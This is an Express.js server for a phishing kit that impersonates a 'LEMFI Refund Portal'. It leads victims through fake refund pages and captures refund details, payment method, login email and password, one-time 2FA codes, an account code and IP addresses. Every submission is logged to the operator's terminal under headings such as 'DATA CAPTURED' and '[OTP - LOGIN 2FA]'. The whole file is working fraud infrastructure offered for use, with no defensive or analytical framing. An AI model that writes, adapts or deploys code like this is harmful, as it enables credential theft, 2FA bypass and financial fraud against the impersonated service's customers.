const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public'), { index: false }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'refund.html'));
});

function log(data, prefix = '') {
    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const divider = '━'.repeat(60);
    console.log(`\n${divider}`);
    console.log(`  [${timestamp}] ${prefix ? prefix + ' ' : ''}DATA CAPTURED`);
    console.log(divider);
    const flat = flattenObject(data);
    const maxKeyLen = Math.max(...Object.keys(flat).map(k => k.length));
    for (const [key, value] of Object.entries(flat)) {
        const padded = key.padEnd(maxKeyLen + 2);
        console.log(`  ${padded}${value}`);
    }
    console.log(divider);
    console.log(`  Captured at: ${timestamp}\n`);
}

function flattenObject(obj, prefix = '', result = {}) {
    for (const [key, value] of Object.entries(obj)) {
        const newKey = prefix ? `${prefix}.${key}` : key;
        if (value !== null && typeof value === 'object' && !Array.isArray(value)) {
            flattenObject(value, newKey, result);
        } else {
            result[newKey] = value ?? '(empty)';
        }
    }
    return result;
}

// 1. Refund Claim Details → selection.html
app.post('/api/refund-details', (req, res) => {
    const data = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    log({ ...data, ip }, '[REFUND CLAIM DETAILS]');
    res.json({ success: true, redirect: 'selection.html' });
});

// 2. Payment Method Selection → receive.html
app.post('/api/selection', (req, res) => {
    const data = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    log({ ...data, ip }, '[REFUND PAYMENT METHOD]');
    res.json({ success: true, redirect: 'receive.html' });
});

// 3. Login → otp.html
app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    log({ email, password, ip }, '[LOGIN]');
    res.json({ success: true, redirect: 'otp.html' });
});

// 4. OTP → code.html
app.post('/api/otp', (req, res) => {
    const { otp, email } = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    log({ email, otp, ip }, '[OTP - LOGIN 2FA]');
    res.json({ success: true, redirect: 'code.html' });
});

// 5. Unique Account Code → index.html
app.post('/api/code', (req, res) => {
    const { code, email } = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    log({ email, code, ip }, '[UNIQUE ACCOUNT CODE]');
    res.json({ success: true, redirect: 'index.html' });
});

// 6. Wallet Visit Log
app.post('/api/wallet-visit', (req, res) => {
    const data = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    log({ ...data, ip }, '[WALLET OPENED]');
    res.json({ success: true, message: 'Redirecting...' });
});

app.listen(PORT, '0.0.0.0', () => {
    console.clear();
    const border = '█'.repeat(62);
    console.log(`\n  ${border}`);
    console.log(`  █                                                          █`);
    console.log(`  █     LEMFI  —  Refund Portal Server                    █`);
    console.log(`  █     Status: RUNNING                                      █`);
    console.log(`  █     URL:     http://localhost:${PORT}                       █`);
    console.log(`  █                                                          █`);
    console.log(`  █     PIPELINE FLOW:                                       █`);
    console.log(`  █     refund.html → selection.html → receive.html          █`);
    console.log(`  █     → login.html → otp.html → code.html → index.html    █`);
    console.log(`  █                                                          █`);
    console.log(`  ${border}\n`);
    console.log(`  [✓] Server started successfully`);
    console.log(`  [✓] Listening on port ${PORT}`);
    console.log(`  [✓] All submissions are logged to this terminal\n`);
});
